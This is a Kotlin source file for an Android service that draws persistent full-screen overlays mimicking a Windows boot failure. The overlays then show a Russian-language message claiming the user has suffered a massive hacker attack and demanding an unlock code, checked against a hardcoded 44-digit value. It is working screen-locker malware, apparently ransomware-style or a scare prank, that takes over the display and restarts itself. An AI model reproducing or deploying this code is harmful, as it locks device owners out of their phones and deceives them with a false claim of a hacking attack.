package com.clawd.locker

import android.app.Service
import android.content.Intent
import android.graphics.Color
import android.graphics.PixelFormat
import android.graphics.Typeface
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.text.InputType
import android.view.Gravity
import android.view.View
import android.view.WindowManager
import android.widget.Button
import android.widget.EditText
import android.widget.LinearLayout
import android.widget.TextView

class LockOverlayService : Service() {
    private lateinit var windowManager: WindowManager
    private lateinit var overlayView: LinearLayout
    private lateinit var mainText: TextView
    private lateinit var inputLayout: LinearLayout
    
    private val PASSWORD = "12223914637140022111122333223617182918736527"

    override fun onCreate() {
        super.onCreate()
        windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
        
        val params = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY else WindowManager.LayoutParams.TYPE_PHONE,
            WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
            PixelFormat.TRANSLUCENT
        )
        
        overlayView = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            setBackgroundColor(Color.RED)
        }
        
        mainText = TextView(this).apply {
            setTextColor(Color.WHITE)
            textSize = 12f
            typeface = Typeface.MONOSPACE
            gravity = Gravity.CENTER
            text = "Booting Windows...\nBoot error: 0x03527737\nBoot error: 0x0266712\nBoot error: 0x02897593\nBoot error: 0x01447812\nBoot error: 0x0150974\nBoot error: 0x03873700\nBoot error: 0x0700882\nBoot error: 0x03803618\nMemory section at address 0x0424* is locked!\nService UXCryptor started.\n\n* Windows blocked!"
        }
        overlayView.addView(mainText)
        
        inputLayout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            visibility = View.GONE
            setPadding(20, 20, 20, 20)
            setBackgroundColor(Color.parseColor("#0000AA"))
        }
        
        val hintText = TextView(this).apply {
            text = "УВЫ! Вы подверглись масштабной хакерской атаке.\nВведите код разблокировки:"
            setTextColor(Color.WHITE)
            textSize = 16f
            gravity = Gravity.CENTER
        }
        
        val input = EditText(this).apply {
            hint = "Введите код"
            inputType = InputType.TYPE_CLASS_NUMBER
        }
        
        val btnUnlock = Button(this).apply {
            text = "РАЗБЛОКИРОВАТЬ"
            setOnClickListener {
                if (input.text.toString() == PASSWORD) {
                    stopSelf()
                } else {
                    input.error = "Неверный код!"
                }
            }
        }
        
        inputLayout.addView(hintText)
        inputLayout.addView(input)
        inputLayout.addView(btnUnlock)

        windowManager.addView(overlayView, params)
        windowManager.addView(inputLayout, params)

        startAnimation()
    }

    private fun startAnimation() {
        val handler = Handler(Looper.getMainLooper())
        
        handler.postDelayed({
            mainText.text = """
                MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
                MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
                MMMMMMMM              MMMMMMMM
                MMMMMM    MMMMMMMM    MMMMMMMM
                MMMMM   MMMMMMMMMMMM   MMMMMMM
                MMMM   MMMMMMMMMMMMMM   MMMMMM
                MMM    MMMMMMMMMMMMMM    MMMM
                MMM    MMMMMMMMMMMMMM    MMMM
                MMMM   MMMMMMMMMMMMMM   MMMMMM
                MMMMM   MMMMMMMMMMMM   MMMMMMM
                MMMMMM    MMMMMMMM    MMMMMMMM
                MMMMMMMM              MMMMMMMM
                MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
                MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
            """.trimIndent()
            mainText.textSize = 18f
            
            handler.postDelayed({
                overlayView.visibility = View.GONE
                inputLayout.visibility = View.VISIBLE
            }, 5000)
            
        }, 5000)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY
    override fun onBind(intent: Intent?): IBinder? = null
    
    override fun onDestroy() {
        super.onDestroy()
        if (::overlayView.isInitialized) windowManager.removeView(overlayView)
        if (::inputLayout.isInitialized) windowManager.removeView(inputLayout)
    }
} 
